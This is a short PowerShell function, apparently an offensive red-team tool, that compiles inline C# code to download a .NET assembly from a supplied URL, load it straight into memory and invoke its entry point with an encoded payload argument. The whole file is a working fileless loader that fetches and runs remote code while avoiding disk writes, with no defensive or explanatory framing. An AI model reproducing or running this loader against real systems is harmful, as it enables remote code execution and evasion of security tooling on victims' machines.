function Invoke-MemoryNPS {
	[CmdletBinding()]
	Param(
		[String]$NPSUrl,

		[String]$EncodedPayload
	)

	$source = @"
using System;
using System.Net;
using System.Reflection;

namespace nps
{
    public static class csharp
    {
        public static void LoadBinary(string url, string payload)
        {
        	WebClient wc = new WebClient();
        	Byte[] buffer = wc.DownloadData(url);
            var assembly = Assembly.Load(buffer);
			var entry = assembly.EntryPoint;
			var args = new string[2] {"-enc", payload};
			var nothing = entry.Invoke(null, new object[] { args });
        }
    }
}
"@

	if (-not ([System.Management.Automation.PSTypeName]'nps.csharp').Type)
	{
	    Add-Type -ReferencedAssemblies $Assem -TypeDefinition $source -Language CSharp
	}
	[nps.csharp]::LoadBinary($NPSUrl, $EncodedPayload)
}